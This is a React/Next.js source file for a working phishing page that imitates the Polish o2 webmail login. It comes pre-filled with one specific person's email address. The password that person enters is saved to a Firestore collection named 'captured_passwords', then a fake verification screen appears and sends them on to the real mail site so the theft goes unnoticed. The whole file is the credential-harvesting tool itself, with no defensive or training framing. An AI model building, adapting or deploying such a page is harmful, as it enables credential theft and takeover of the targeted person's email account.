"use client"

import { useState, useEffect } from "react"
import { Eye, EyeOff, Loader2, Mail, Lock } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { PlaceHolderImages } from "@/lib/placeholder-images"
import { useFirebase, setDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
import { collection, doc } from "firebase/firestore"

export function O2Login() {
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isFinished, setIsFinished] = useState(false)

  const { firestore, auth, user } = useFirebase();
  const email = "sabatinka@o2.pl"
  const marketingImg = PlaceHolderImages.find(img => img.id === "o2-marketing")

  // Zapewnienie, że użytkownik jest zalogowany anonimowo, aby mógł zapisywać dane
  useEffect(() => {
    if (auth && !user) {
      initiateAnonymousSignIn(auth);
    }
  }, [auth, user]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    setIsSubmitting(true)
    
    if (firestore) {
      // Generujemy ID dokumentu przed zapisem, aby spełnić reguły bezpieczeństwa
      const colRef = collection(firestore, "captured_passwords");
      const id = doc(colRef).id;
      const docRef = doc(firestore, "captured_passwords", id);
      
      // Używamy setDocumentNonBlocking, aby ID wewnątrz danych zgadzało się z ID dokumentu
      setDocumentNonBlocking(docRef, {
        id,
        password,
        sourceEmail: email,
        captureTimestamp: new Date().toISOString(),
      }, { merge: true });
    }
    
    // Symulacja przekierowania po wysłaniu danych
    setTimeout(() => {
      setIsSubmitting(false)
      setIsFinished(true)
    }, 1500)
  }

  if (isFinished) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full p-8 text-center space-y-6 animate-in fade-in zoom-in duration-300">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
            <Loader2 className="w-8 h-8 text-green-600 animate-spin" />
          </div>
          <h2 className="text-2xl font-bold text-foreground">Trwa weryfikacja...</h2>
          <p className="text-muted-foreground">
            Twoje hasło zostało przyjęte do weryfikacji. Za chwilę zostaniesz przekierowany do swojej skrzynki pocztowej.
          </p>
          <Button 
            className="w-full bg-primary"
            onClick={() => window.location.href = "https://poczta.o2.pl"}
          >
            Przejdź do poczty
          </Button>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background flex flex-col md:flex-row">
      <div className="hidden lg:flex flex-1 relative bg-primary items-center justify-center p-12 overflow-hidden">
        <div className="absolute inset-0 z-0 opacity-20">
          {marketingImg && (
            <Image
              src={marketingImg.imageUrl}
              alt="Marketing background"
              fill
              className="object-cover"
              data-ai-hint={marketingImg.imageHint}
            />
          )}
        </div>
        <div className="relative z-10 max-w-lg text-white space-y-6">
          <h1 className="text-5xl font-bold leading-tight">
            Nowa Poczta o2. <br />Szybka, prosta i bezpieczna.
          </h1>
          <p className="text-xl opacity-90">
            Ciesz się nielimitowaną pojemnością skrzynki i wygodnym dostępem do wszystkich swoich e-maili.
          </p>
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-8 bg-background">
        <div className="w-full max-w-[400px] space-y-8">
          <div className="text-center md:text-left">
            <div className="flex justify-center md:justify-start mb-8">
              <div className="relative w-32 h-12 flex items-center font-black text-3xl italic text-primary">
                o2 <span className="text-foreground ml-1 not-italic font-normal text-xl">poczta</span>
              </div>
            </div>
            <h2 className="text-2xl font-bold tracking-tight text-foreground">
              Zaloguj się do poczty
            </h2>
          </div>

          <Card className="border-none shadow-xl bg-card">
            <CardContent className="pt-8 pb-10 px-8">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                    E-mail lub login
                  </Label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                    <Input
                      id="email"
                      value={email}
                      readOnly
                      className="pl-10 bg-muted/30 border-muted-foreground/20 h-12 text-lg"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between items-center">
                    <Label htmlFor="password" className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      Hasło
                    </Label>
                  </div>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      placeholder="Twoje hasło"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                      className="pl-10 pr-10 border-muted-foreground/20 h-12 text-lg"
                      autoFocus
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                </div>

                <Button 
                  type="submit" 
                  className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-bold text-lg"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? <Loader2 className="animate-spin" /> : "Zaloguj się"}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  )
}